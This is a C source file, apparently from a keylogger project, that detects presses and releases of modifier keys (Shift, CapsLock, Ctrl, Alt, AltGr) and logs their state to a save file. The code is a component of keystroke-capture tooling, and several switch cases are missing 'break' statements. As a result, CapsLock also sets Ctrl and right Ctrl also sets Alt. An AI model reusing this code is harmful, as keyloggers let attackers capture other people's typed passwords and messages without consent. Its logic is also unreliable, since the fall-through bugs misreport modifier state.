#include "keymap.h"

static int		is_mod_press(t_keylogger *klg)
{
	switch (klg->event.code)
	{
		case SHIFT_L:
			klg->mod.shift = 1;
			break;
		case SHIFT_R:
			klg->mod.shift = 1;
			break ;
		case CAPS_LOCK:
			klg->mod.capslock = 1;
		case CTRL_L:
			klg->mod.ctrl = 1;
            dprintf(klg->saveFD, "CTRL TRUE\n");
			break ;
		case CTRL_R:
			klg->mod.ctrl = 1;
            dprintf(klg->saveFD, "CTRL TRUE\n");
        case ALT_L:
            klg->mod.alt = 1;
            dprintf(klg->saveFD, "ALT_L TRUE\n");
            break ;
        case ALT_META:
            klg->mod.alt = 1;
            dprintf(klg->saveFD, "ALT_META TRUE\n");
            break ;
        case ALT_R:
            klg->mod.mod = 1;
            dprintf(klg->saveFD, "ALT_GR TRUE\n");
            break ;
		default:
			return FALSE;
			break;
	}
	return TRUE;
}
static int		is_mod_release(t_keylogger *klg)
{
	switch (klg->event.code)
	{
		case SHIFT_L:
			klg->mod.shift = 0;
			break;
		case SHIFT_R:
			klg->mod.shift = 0;
			break;
		case CAPS_LOCK:
			klg->mod.capslock = 0;
		case CTRL_L:
			klg->mod.ctrl = 0;
            dprintf(klg->saveFD, "CTRL FALSE\n");
			break;
		case CTRL_R:
			klg->mod.ctrl = 0;
            dprintf(klg->saveFD, "CTRL FALSE\n");
        case ALT_L:
            klg->mod.alt = 0;
            dprintf(klg->saveFD, "ALT_L FALSE\n");
            break;
        case ALT_META:
            klg->mod.alt = 0;
            break;
        case ALT_R:
            dprintf(klg->saveFD, "ALT_GR FALSE\n");
            klg->mod.mod = 0;
            break ;
		default:
			return FALSE;
			break;
	}
	return TRUE;
}
int		is_mod_key(t_keylogger *klg)
{
	if (klg->event.value == 1)
		return is_mod_press(klg);
	else if (klg->event.value == 0)
		return is_mod_release(klg);
	return 0;
}